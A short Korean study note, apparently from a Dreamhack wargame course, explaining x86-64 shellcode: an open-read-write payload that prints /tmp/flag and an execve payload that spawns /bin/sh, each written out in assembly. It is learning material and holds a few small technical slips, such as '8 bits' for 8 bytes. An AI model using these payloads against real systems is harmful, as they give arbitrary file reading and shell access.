# Shellcode

## 셸코드란?
- 상대 시스템을 공격(exploit)하기 위한 코드
- 기본적으로는 어셈블리 코드 조각을 말하나, pwntools를 통해 쉬운 익스플로잇이 가능함.

## orw 셸코드
orw셸코드: 파일을 열고 읽은 뒤 화면에 출력해주는 셸코드.
드림핵 강의에서는 "/tmp/" 에 있는 flag를 읽는 코드를 설명한다.

그걸 수도 코드로 나타내게 되면

```c
char buf[0x30];
int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30);
write(1, buf, 0x30);
```

orw 셸코드를 어셈블리로 작성하려면 syscall들을 알아야한다.
여기서는 read, write, open을 알면 된다.

### open
우선은 /tmp/flag 라는 문자열 자체를 메모리에 위치시켜야한다.

```bash
echo -n "/tmp/flag" | xxd -p | sed 's/../& /g' | awk '{for(i=NF;i>0;i--)printf $i;print ""}'
```
를 통해 16진수 리틀 앤디언으로 변경이 가능하다.


```bash
echo -n "/tmp/flag" | xxd -p | sed 's/../& /g' | awk '{for(i=NF;i>0;i--)printf $i;print ""}'

67616c662f706d742f
```
스택에는 8비트만 넣을 수 있어서 실제 16진수 값 전체를 넣어줄 수 없다.

```asm
push 0x67 ; 0x67을 먼저 push
mov rax, 0x616c662f706d742f
push rax ; 실제 값을 넣어줌
mov rdi, rsp
xor rsi, rsi ; rsi = 0, xor명령어-> 각 비트가 서로 다른 값일때만 1
xor rdx, rdx ; rdx = 0
mov rax, 2
syscall
```

### read
함수의 반환값은 rax로 들어온다. 따라서 open으로 얻은 /tmp/flag 은 rax에 저장된다. 이제 /tmp/flag을 읽어올(read) 차례다. read의 첫 번째 인자를 /tmp/flag으로 설정해야하므로 rax를 rdi에 대입한다.

```asm
mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall
```

### write

RDI: 목적지 주소 저장
write syscall.-> rax를 1로 설정

```asm
mov rdi, 1
mov rax, 0x1
syscall
```

위 코드를 모두 합치면 최종 orw 쉘코드가 된다.

## execve 셸코드
임의의 프로그램을 실행하는 셸코드이다.
따라서 execve 시스템 콜만으로 충분하다.

```asm
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
```


